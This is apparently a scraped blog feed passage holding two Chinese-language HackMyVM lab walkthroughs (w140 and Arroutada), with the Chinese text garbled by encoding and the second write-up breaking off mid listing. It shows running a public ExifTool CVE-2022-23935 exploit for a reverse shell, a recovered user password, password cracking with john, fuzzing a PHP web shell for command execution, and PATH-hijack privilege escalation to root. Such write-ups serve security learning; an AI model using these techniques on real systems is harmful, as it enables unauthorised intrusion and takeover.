‚îî‚îÄ$ searchsploit ExifTool 12.3 
Exploits: No Results
Shellcodes: No Results
                                                                                                                                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ searchsploit ExifTool 12  
---------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                      |  Path
---------------------------------------------------------------------------------------------------- ---------------------------------
ExifTool 12.23 - Arbitrary Code Execution                                                           | linux/local/50911.py
---------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                         
```

ÁâàÊú¨‰∏ç‰∏ÄÊ†∑ÔºåÊàë‰ª¨ÁªßÁª≠ÊêúÁ¥¢

https://github.com/cowsecurity/CVE-2022-23935ÊâæÂà∞‰∏Ä‰∏™ÁâàÊú¨‰∏ÄÊ†∑ÁöÑÔºåÊàë‰ª¨Â∞ùËØïÂà©Áî®

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ git clone https://github.com/0xFTW/CVE-2022-23935
Ê≠£ÂÖãÈöÜÂà∞ 'CVE-2022-23935'...
remote: Enumerating objects: 7, done.
remote: Counting objects: 100% (7/7), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 7 (delta 1), reused 7 (delta 1), pack-reused 0 (from 0)
Êé•Êî∂ÂØπË±°‰∏≠: 100% (7/7), ÂÆåÊàê.
Â§ÑÁêÜ delta ‰∏≠: 100% (1/1), ÂÆåÊàê.
                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cd CVE-2022-23935 
                                                                                                                                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/CVE-2022-23935]
‚îî‚îÄ$chmod +x CVE-2022-23935.py

‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/CVE-2022-23935]
‚îî‚îÄ$ python3 -m venv env
                                                                                                                                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/CVE-2022-23935]
‚îî‚îÄ$ source env/bin/activate
                                                                                                                                    
‚îå‚îÄ‚îÄ(env)‚îÄ(kali„âøkali)-[~/test/CVE-2022-23935]
‚îî‚îÄ$ pip3 install pwntools
Collecting pwntools
  Using cached pwntools-4.14.0-py2.py3-none-any.whl.metadata (5.3 kB)
Collecting paramiko&gt;=1.15.2 (from pwntools)
  Downloading paramiko-3.5.1-py3-none-any.whl.metadata (4.6 kB)
Collecting mako&gt;=1.0.0 (from pwntools)
  Downloading Mako-1.3.9-py3-none-any.whl.metadata (2.9 kB)
Collecting pyelftools&gt;=0.29 (from pwntools)
  Using cached pyelftools-0.31-py3-none-any.whl.metadata (381 bytes)
Collecting capstone&gt;=3.0.5rc2 (from pwntools)
  Using cached capstone-6.0.0a3-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.8 kB)
Collecting ropgadget&gt;=5.3 (from pwntools)
  Using cached ROPGadget-7.6-py3-none-any.whl.metadata (1.0 kB)
Collecting pyserial&gt;=2.7 (from pwntools)
  Using cached pyserial-3.5-py2.py3-none-any.whl.metadata (1.6 kB)
Collecting requests&gt;=2.0 (from pwntools)
  Using cached requests-2.32.3-py3-none-any.whl.metadata (4.6 kB)
Requirement already satisfied: pip&gt;=6.0.8 in ./env/lib/python3.12/site-packages (from pwntools) (25.0)
Collecting pygments&gt;=2.0 (from pwntools)
  Using cached pygments-2.19.1-py3-none-any.whl.metadata (2.5 kB)
Collecting pysocks (from pwntools)
  Using cached PySocks-1.7.1-py3-none-any.whl.metadata (13 kB)
Collecting python-dateutil (from pwntools)
  Using cached python_dateutil-2.9.0.post0-py2.py3-none-any.whl.metadata (8.4 kB)
Collecting packaging (from pwntools)
  Using cached packaging-24.2-py3-none-any.whl.metadata (3.2 kB)
Collecting psutil&gt;=3.3.0 (from pwntools)
  Using cached psutil-6.1.1-cp36-abi3-manylinux_2_12_x86_64.manylinux2010_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (22 kB)
Collecting intervaltree&gt;=3.0 (from pwntools)
  Using cached intervaltree-3.1.0-py2.py3-none-any.whl
Collecting sortedcontainers (from pwntools)
  Using cached sortedcontainers-2.4.0-py2.py3-none-any.whl.metadata (10 kB)
Collecting unicorn&gt;=2.0.1 (from pwntools)
  Using cached unicorn-2.1.1-py2.py3-none-manylinux1_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (1.3 kB)
Collecting six&gt;=1.12.0 (from pwntools)
  Using cached six-1.17.0-py2.py3-none-any.whl.metadata (1.7 kB)
Collecting rpyc (from pwntools)
  Using cached rpyc-6.0.1-py3-none-any.whl.metadata (3.5 kB)
Collecting colored_traceback (from pwntools)
  Using cached colored_traceback-0.4.2-py3-none-any.whl.metadata (4.6 kB)
Collecting unix-ar (from pwntools)
  Using cached unix_ar-0.2.1-py2.py3-none-any.whl.metadata (1.9 kB)
Collecting zstandard (from pwntools)
  Using cached zstandard-0.23.0-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.0 kB)
Collecting MarkupSafe&gt;=0.9.2 (from mako&gt;=1.0.0-&gt;pwntools)
  Using cached MarkupSafe-3.0.2-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (4.0 kB)
Collecting bcrypt&gt;=3.2 (from paramiko&gt;=1.15.2-&gt;pwntools)
  Using cached bcrypt-4.2.1-cp39-abi3-manylinux_2_28_x86_64.whl.metadata (9.8 kB)
Collecting cryptography&gt;=3.3 (from paramiko&gt;=1.15.2-&gt;pwntools)
  Using cached cryptography-44.0.0-cp39-abi3-manylinux_2_28_x86_64.whl.metadata (5.7 kB)
Collecting pynacl&gt;=1.5 (from paramiko&gt;=1.15.2-&gt;pwntools)
  Using cached PyNaCl-1.5.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.manylinux_2_24_x86_64.whl.metadata (8.6 kB)
Collecting charset-normalizer&lt;4,&gt;=2 (from requests&gt;=2.0-&gt;pwntools)
  Using cached charset_normalizer-3.4.1-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (35 kB)
Collecting idna&lt;4,&gt;=2.5 (from requests&gt;=2.0-&gt;pwntools)
  Using cached idna-3.10-py3-none-any.whl.metadata (10 kB)
Collecting urllib3&lt;3,&gt;=1.21.1 (from requests&gt;=2.0-&gt;pwntools)
  Using cached urllib3-2.3.0-py3-none-any.whl.metadata (6.5 kB)
Collecting certifi&gt;=2017.4.17 (from requests&gt;=2.0-&gt;pwntools)
  Using cached certifi-2025.1.31-py3-none-any.whl.metadata (2.5 kB)
Collecting plumbum (from rpyc-&gt;pwntools)
  Using cached plumbum-1.9.0-py3-none-any.whl.metadata (10 kB)
Collecting cffi&gt;=1.12 (from cryptography&gt;=3.3-&gt;paramiko&gt;=1.15.2-&gt;pwntools)
  Using cached cffi-1.17.1-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (1.5 kB)
Collecting pycparser (from cffi&gt;=1.12-&gt;cryptography&gt;=3.3-&gt;paramiko&gt;=1.15.2-&gt;pwntools)
  Using cached pycparser-2.22-py3-none-any.whl.metadata (943 bytes)
Using cached pwntools-4.14.0-py2.py3-none-any.whl (12.9 MB)
Using cached capstone-6.0.0a3-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.3 MB)
Downloading Mako-1.3.9-py3-none-any.whl (78 kB)
Downloading paramiko-3.5.1-py3-none-any.whl (227 kB)
Using cached psutil-6.1.1-cp36-abi3-manylinux_2_12_x86_64.manylinux2010_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl (287 kB)
Using cached pyelftools-0.31-py3-none-any.whl (180 kB)
Using cached pygments-2.19.1-py3-none-any.whl (1.2 MB)
Using cached pyserial-3.5-py2.py3-none-any.whl (90 kB)
Using cached requests-2.32.3-py3-none-any.whl (64 kB)
Using cached ROPGadget-7.6-py3-none-any.whl (32 kB)
Using cached six-1.17.0-py2.py3-none-any.whl (11 kB)
Using cached sortedcontainers-2.4.0-py2.py3-none-any.whl (29 kB)
Using cached unicorn-2.1.1-py2.py3-none-manylinux1_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl (16.2 MB)
Using cached colored_traceback-0.4.2-py3-none-any.whl (5.5 kB)
Using cached packaging-24.2-py3-none-any.whl (65 kB)
Using cached PySocks-1.7.1-py3-none-any.whl (16 kB)
Using cached python_dateutil-2.9.0.post0-py2.py3-none-any.whl (229 kB)
Using cached rpyc-6.0.1-py3-none-any.whl (74 kB)
Using cached unix_ar-0.2.1-py2.py3-none-any.whl (6.5 kB)
Using cached zstandard-0.23.0-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (5.4 MB)
Using cached bcrypt-4.2.1-cp39-abi3-manylinux_2_28_x86_64.whl (278 kB)
Using cached certifi-2025.1.31-py3-none-any.whl (166 kB)
Using cached charset_normalizer-3.4.1-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (145 kB)
Using cached cryptography-44.0.0-cp39-abi3-manylinux_2_28_x86_64.whl (4.2 MB)
Using cached idna-3.10-py3-none-any.whl (70 kB)
Using cached MarkupSafe-3.0.2-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (23 kB)
Using cached PyNaCl-1.5.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.manylinux_2_24_x86_64.whl (856 kB)
Using cached urllib3-2.3.0-py3-none-any.whl (128 kB)
Using cached plumbum-1.9.0-py3-none-any.whl (127 kB)
Using cached cffi-1.17.1-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (479 kB)
Using cached pycparser-2.22-py3-none-any.whl (117 kB)
Installing collected packages: unicorn, sortedcontainers, pyserial, pyelftools, zstandard, urllib3, unix-ar, six, pysocks, pygments, pycparser, psutil, plumbum, packaging, MarkupSafe, intervaltree, idna, charset-normalizer, certifi, capstone, bcrypt, rpyc, ropgadget, requests, python-dateutil, mako, colored_traceback, cffi, pynacl, cryptography, paramiko, pwntools
Successfully installed MarkupSafe-3.0.2 bcrypt-4.2.1 capstone-6.0.0a3 certifi-2025.1.31 cffi-1.17.1 charset-normalizer-3.4.1 colored_traceback-0.4.2 cryptography-44.0.0 idna-3.10 intervaltree-3.1.0 mako-1.3.9 packaging-24.2 paramiko-3.5.1 plumbum-1.9.0 psutil-6.1.1 pwntools-4.14.0 pycparser-2.22 pyelftools-0.31 pygments-2.19.1 pynacl-1.5.0 pyserial-3.5 pysocks-1.7.1 python-dateutil-2.9.0.post0 requests-2.32.3 ropgadget-7.6 rpyc-6.0.1 six-1.17.0 sortedcontainers-2.4.0 unicorn-2.1.1 unix-ar-0.2.1 urllib3-2.3.0 zstandard-0.23.0
                                                                                                                                    
‚îå‚îÄ‚îÄ(env)‚îÄ(kali„âøkali)-[~/test/CVE-2022-23935]
‚îî‚îÄ$ python3 CVE-2022-23935.py 192.168.205.128 8888
/home/kali/test/CVE-2022-23935/CVE-2022-23935.py:14: SyntaxWarning: invalid escape sequence '\ '
  print('''
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/kali/.cache/.pwntools-cache-3.12/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or /home/kali/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] You have the latest version of Pwntools (4.14.0)
[+] Connected!!!!

   _____ __      __ ______      ___    ___  ___   ___        ___   ____    ___  ____   _____ 
  / ____|\ \    / /|  ____|    |__ \  / _ \|__ \ |__ \      |__ \ |___ \  / _ \|___ \ | ____|
 | |      \ \  / / | |__  ______  ) || | | |  ) |   ) |______  ) |  __) || (_) | __) || |__  
 | |       \ \/ /  |  __||______|/ / | | | | / /   / /|______|/ /  |__ &lt;  \__, ||__ &lt; |___ \ 
 | |____    \  /   | |____      / /_ | |_| |/ /_  / /_       / /_  ___) |   / / ___) | ___) |
  \_____|    \/    |______|    |____| \___/|____||____|     |____||____/   /_/ |____/ |____/       

                                            by 0xFTW                                                                              
      
[+] Trying to bind to :: on port 8888: Done
[+] Waiting for connections on :::8888: Got connection from ::ffff:192.168.205.131 on port 37880
[*] Switching to interactive mode
bash: cannot set terminal process group (376): Inappropriate ioctl for device
bash: no job control in this shell
www-data@w140:/var/www/uploads/1738979826$ $ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

![image-20250331185917326](https://7r1umphk.github.io/image/20250331185917403.png)

# 3.ÊèêÊùÉ

```
www-data@w140:/var/www/uploads/1738979826$ $ sudo -l
sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
sudo: a password is required
www-data@w140:/var/www/uploads/1738979826$ $ cd ..
cd ..
www-data@w140:/var/www/uploads$ $ ls -la
ls -la
total 16
drwx------ 4 www-data root     4096 Feb  7 20:57 .
drwxr-xr-x 4 root     root     4096 Feb 21  2023 ..
drwxr-xr-x 2 www-data www-data 4096 Feb  7 20:51 1738979493
drwxr-xr-x 2 www-data www-data 4096 Feb  7 20:57 1738979826
www-data@w140:/var/www/uploads$ $ cd ..
cd ..
www-data@w140:/var/www$ $ ls -al
ls -al
total 48
drwxr-xr-x  4 root     root  4096 Feb 21  2023 .
drwxr-xr-x 12 root     root  4096 Jan 29  2023 ..
-rw-r--r--  1 root     root 28744 Feb 21  2023 .w140.png
drwxr-xr-x  7 root     root  4096 Feb 14  2023 html
drwx------  4 www-data root  4096 Feb  7 20:57 uploads
```

Êúâ‰∏™ÂõæÁâá‰º†ËøáÊù•ÁúãÁúã

![image-20250331185924540](https://7r1umphk.github.io/image/20250331185924622.png)

qrÔºåÊàë‰ª¨ËØÜÂà´‰∏Ä‰∏ã

![image-20250331185931745](https://7r1umphk.github.io/image/20250331185931796.png)

ÁôªÂΩï

```
www-data@w140:/var/www$ $ cd /home/
cd /home/
www-data@w140:/home$ $ ls
ls
ghost
www-data@w140:/home$ $ su - ghost
su - ghost
Password: $ BaoeCblP5KGJDmA
$ id
uid=1000(ghost) gid=1000(ghost) groups=1000(ghost),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
$ sudo -l
Matching Defaults entries for ghost on w140:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ghost may run the following commands on w140:
    (root) SETENV: NOPASSWD: /opt/Benz-w140
```

ÁúãÂà∞SETENVÔºåÊàëÂ∞±Áü•ÈÅìÊòØÁéØÂ¢ÉÂèòÈáèÂä´ÊåÅ‰∫Ü

```
$ cd /opt/
$ ls -la
total 20
drwxr-xr-x  3 root root 4096 Feb 18  2023 .
drwxr-xr-x 18 root root 4096 Jan 29  2023 ..
-rw-------  1 root root    5 Feb 18  2023 .bashre
-rwxr-xr-x  1 root root  423 Feb 17  2023 Benz-w140
drwxr-xr-x  8 root root 4096 Dec  8  2021 exiftool
$ cat /opt/Benz-w140
                                                                                                             
#!/bin/bash
. /opt/.bashre
cd /home/ghost/w140    

# clean up log files
if [ -s log/w140.log ] &amp;&amp; ! [ -L log/w140.log ]
then
/bin/cat log/w140.log &gt; log/w140.log.old
/usr/bin/truncate -s@ log/w140.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

findÊ≤°ÊúâÁªùÂØπÂú∞ÂùÄÔºåÊâÄ‰ª•

```
$ cd /tmp/
$ echo 'cp /bin/bash /tmp/sh;chmod u+s /tmp/sh' &gt; find
$ chmod +x find
$ ls -la
total 836
drwxrwxrwt  2 root     root       4096 Feb  7 21:11 .
drwxr-xr-x 18 root     root       4096 Jan 29  2023 ..
-rwxr-xr-x  1 ghost    ghost        39 Feb  7 21:11 find
-rwxr-xr-x  1 www-data www-data 839766 Jan 29 04:04 linpeas.sh
$ cat find
cp /bin/bash /tmp/sh;chmod u+s /tmp/sh
$ sudo PATH=$PWD:$PATH /opt/Benz-w140
/opt/Benz-w140: 4: cd: can't cd to /home/ghost/w140
$ ls -la
total 2044
drwxrwxrwt  2 root     root        4096 Feb  7 21:13 .
drwxr-xr-x 18 root     root        4096 Jan 29  2023 ..
-rwxr-xr-x  1 ghost    ghost         39 Feb  7 21:11 find
-rwxr-xr-x  1 www-data www-data  839766 Jan 29 04:04 linpeas.sh
-rwsr-xr-x  1 root     root     1234376 Feb  7 21:13 sh
$ /tmp/sh -p
$ id
uid=1000(ghost) gid=1000(ghost) euid=0(root) groups=1000(ghost),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```



&lt;!-- ##{'timestamp':1739012133}## --&gt;sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_w140.html</guid><pubDate>Sat, 08 Feb 2025 10:55:33 +0000</pubDate></item><item><title>hmv_Arroutada</title><link>https://7r1UMPHK.github.io/post/hmv_Arroutada.html</link><description># 0.ÁÆÄ‰ªã

Èù∂Êú∫Ôºöhttps://hackmyvm.eu/machines/machine.php?vm=Arroutada
 ÈöæÂ∫¶ÔºöÁªøËâ≤
 ÁõÆÊ†á IPÔºö192.168.205.151
 Êú¨Êú∫ IPÔºö192.168.205.128

# 1.Êâ´Êèè

nmapËµ∑Êâã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -A -Pn -n --min-rate 10000 192.168.205.151
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-08 16:47 CST
Nmap scan report for 192.168.205.151
Host is up (0.00024s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:06:46:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4)
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.24 ms 192.168.205.151

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.81 seconds
                                                        
```

# 2.Ë∏©ÁÇπ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.151
&lt;div align='center'&gt;&lt;img src='imgs/apreton.png'&gt;&lt;/div&gt;
```

ÁàÜÁ†¥ÁõÆÂΩï

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.151 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v '403'
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.151
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 59]
/.                    (Status: 200) [Size: 59]
/imgs                 (Status: 301) [Size: 317] [--&gt; http://192.168.205.151/imgs/]
/scout                (Status: 301) [Size: 318] [--&gt; http://192.168.205.151/scout/]
Progress: 598000 / 598005 (100.00%)
===============================================================                                                                      
Finished
===============================================================
```

Êü•Áúã/scout

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.151/scout/

&lt;div&gt;
&lt;p&gt;
Hi, Telly,
&lt;br&gt;
&lt;br&gt;
I just remembered that we had a folder with some important shared documents. The problem is that I don't know wich first path it was in, but I do know the second path. Graphically represented:
&lt;br&gt;
/scout/******/docs/
&lt;br&gt;
&lt;br&gt;
With continued gratitude,
&lt;br&gt;
J1.
&lt;/p&gt;
&lt;/div&gt;
&lt;!-- Stop please --&gt;
```

ÁàÜÁ†¥

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ wfuzz -u '192.168.205.151/scout/FUZZ/docs/' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 28 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.151/scout/FUZZ/docs/
Total requests: 119600

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                             
=====================================================================

000021664:   200        1016 L   12059 W    189769 Ch   'j2'                                                                

Total time: 59.22016
Processed Requests: 119600
Filtered Requests: 119599
Requests/sec.: 2019.582
```

![image-20250331185406586](https://7r1umphk.github.io/image/20250331185406653.png)

pass.txtÊòØÂ∫üËØùÔºåÁõ¥Êé•‰∏ãshellfile.odsÔºåÁÑ∂ÂêéÊúâÂØÜÁ†ÅÔºåÊàë‰ª¨ÁàÜÁ†¥‰∏Ä‰∏ã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ file shellfile.ods                                            
shellfile.ods: OpenDocument Spreadsheet
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ john --wordlist=/usr/share/wordlists/rockyou.txt hash             
Using default input encoding: UTF-8
Loaded 1 password hash (ODF, OpenDocument Star/Libre/OpenOffice [PBKDF2-SHA1 512/512 AVX512BW 16x BF/AES])
Cost 1 (iteration count) is 100000 for all loaded hashes
Cost 2 (crypto [0=Blowfish 1=AES]) is 1 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
john11           (shellfile.ods)   
1g 0:00:00:08 DONE (2025-02-08 16:53) 0.1177g/s 1967p/s 1967c/s 1967C/s lachina..idiot
Use the '--show --format=ODF' options to display all of the cracked passwords reliably
Session completed. 
```

ÊâìÂºÄÁªô‰∫ÜÊàë‰ª¨‰∏Ä‰∏™Ë∑ØÂæÑ/thejabasshell.phpÔºåÁÇπËøõÂéªÊòØÁ©∫ÁôΩÁöÑÔºåÊâÄ‰ª•Êàë‰ª¨ËøõË°åÁàÜÁ†¥

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ wfuzz -u 'http://192.168.205.151/thejabasshell.php?FUZZ=id' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 0 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.151/thejabasshell.php?FUZZ=id
Total requests: 119600

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                             
=====================================================================

000000280:   200        0 L      5 W        33 Ch       'a'                                                                 
000000557:   200        0 L      0 W        0 Ch        'Controls'                                                          

Total time: 0
Processed Requests: 474
Filtered Requests: 473
Requests/sec.: 0

‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.151/thejabasshell.php?a=id
Error: Problem with parameter 'b'                                                                                                                                
```

ËøòË¶Å‰∏Ä‰∏™bÁöÑÂèÇÊï∞

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ wfuzz -u 'http://192.168.205.151/thejabasshell.php?a=id&amp;b=FUZZ' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 5
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.151/thejabasshell.php?a=id&amp;b=FUZZ
Total requests: 119600

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                             
=====================================================================

000001999:   200        1 L      3 W        54 Ch       'pass'                                                              
 /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 41.29983
Processed Requests: 56690
Filtered Requests: 56689
Requests/sec.: 1372.644

‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl 'http://192.168.205.151/thejabasshell.php?a=id&amp;b=pass'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
                        
```

‰ΩøÁî®aÂèÇÊï∞Âºπ‰∏™shellÂõûÊù•Â∞±Â•Ω‰∫Ü

# 3. Ëé∑ÂæóÁ®≥ÂÆöÁöÑ Shell

Ëé∑ÂèñÂèçÂêë shell ÂêéÔºåÈÄöËøá‰ª•‰∏ãÂëΩ‰ª§Ëé∑ÂæóÁ®≥ÂÆöÁöÑ‰∫§‰∫íÂºè TTY shellÔºö

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.ÊèêÊùÉ

```
www-data@arroutada:/var/www/html$ ls -al
total 24
drwxr-xr-x  4 root root 4096 Jan  8  2023 .
drwxr-xr-x  3 root root 4096 Jan  8  2023 ..
drwxr-xr-x  2 root root 4096 Jan  8  2023 imgs
-rw-r--r--  1 root root   59 Jan  8  2023 index.html
drwxr-xr-x 22 root root 4096 Jan  8  2023 scout
-rw-r--r--  1 root root  174 Jan  8  2023 thejabasshell.php
www-data@arroutada:/var/www/html$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for www-data: 
sudo: a password is required
www-data@arroutada:/var/www/html$ cd ..
www-data@arroutada:/var/www$ ls -la
total 12
drwxr-xr-x  3 root root 4096 Jan  8  2023 .
drwxr-xr-x 12 root root 4096 Jan  8  2023 ..
drwxr-xr-x  4 root root 4096 Jan  8  2023 html
www-data@arroutada:/var/www$ cd ..
www-data@arroutada:/var$ ls -al
total 48
drwxr-xr-x 12 root root  4096 Jan  8  2023 .
drwxr-xr-x 18 root root  4096 Jan  8  2023 ..
drwxr-xr-x  2 root root  4096 Sep  3  2022 backups
drwxr-xr-x 10 root root  4096 Jan  8  2023 cache
drwxr-xr-x 26 root root  4096 Jan  8  2023 lib
drwxrwsr-x  2 root staff 4096 Sep  3  2022 local
lrwxrwxrwx  1 root root     9 Jan  8  2023 lock -&gt; /run/lock
drwxr-xr-x  8 root root  4096 Jan  8  2023 log
drwxrwsr-x  2 root mail  4096 Jan  8  2023 mail
drwxr-xr-x  2 root root  4096 Jan  8  2023 opt
lrwxrwxrwx  1 root root     4 Jan  8  2023 run -&gt; /run
drwxr-xr-x  4 root root  4096 Jan  8  2023 spool
drwxrwxrwt  2 root root  4096 Feb  8 03:46 tmp
drwxr-xr-x  3 root root  4096 Jan  8  2023 www
www-data@arroutada:/var$ cd /home/
www-data@arroutada:/home$ ls -al
total 12
drwxr-xr-x  3 root  root  4096 Jan  8  2023 .
drwxr-xr-x 18 root  root  4096 Jan  8  2023 ..
drwxr-x---  3 drito drito 4096 Jan 10  2023 drito
www-data@arroutada:/home$ cd /opt/
www-data@arroutada:/opt$ ls -al
total 8
drwxr-xr-x  2 root root 4096 Jan  8  2023 .
drwxr-xr-x 18 root root 4096 Jan  8  2023 ..
www-data@arroutada:/opt$ cd /tmp/
www-data@arroutada:/tmp$ sl -al
bash: sl: command not found
www-data@arroutada:/tmp$ ls -al
total 8
drwxrwxrwt  2 root root 4096 Feb  8 03:46 .
drwxr-xr-x 18 root root 4096 Jan  8  2023 ..
www-data@arroutada:/tmp$ cd /
www-data@arroutada:/$ ls -la
total 68
drwxr-xr-x  18 root root  4096 Jan  8  2023 .
drwxr-xr-x  18 root root  4096 Jan  8  2023 ..
lrwxrwxrwx   1 root root     7 Jan  8  2023 bin -&gt; usr/bin
drwxr-xr-x   3 root root  4096 Jan  8  2023 boot
drwxr-xr-x  17 root root  3140 Feb  8 03:46 dev
drwxr-xr-x  66 root root  4096 Feb  8 03:46 etc
drwxr-xr-x   3 root root  4096 Jan  8  2023 home
lrwxrwxrwx   1 root root    31 Jan  8  2023 initrd.img -&gt; boot/initrd.img-5.10.0-20-amd64
lrwxrwxrwx   1 root root    31 Jan  8  2023 initrd.img.old -&gt; boot/initrd.img-5.10.0-18-amd64
lrwxrwxrwx   1 root root     7 Jan  8  2023 lib -&gt; usr/lib
lrwxrwxrwx   1 root root     9 Jan  8  2023 lib32 -&gt; usr/lib32
lrwxrwxrwx   1 root root     9 Jan  8  2023 lib64 -&gt; usr/lib64
lrwxrwxrwx   1 root root    10 Jan  8  2023 libx32 -&gt; usr/libx32
drwx------   2 root root 16384 Jan  8  2023 lost+found
drwxr-xr-x   3 root root  4096 Jan  8  2023 media
drwxr-xr-x   2 root root  4096 Jan  8  2023 mnt
drwxr-xr-x   2 root root  4096 Jan  8  2023 opt
dr-xr-xr-x 150 root root     0 Feb  8 03:46 proc
drwx------   3 root root  4096 Jan  8  2023 root
drwxr-xr-x  17 root root   480 Feb  8 03:46 run
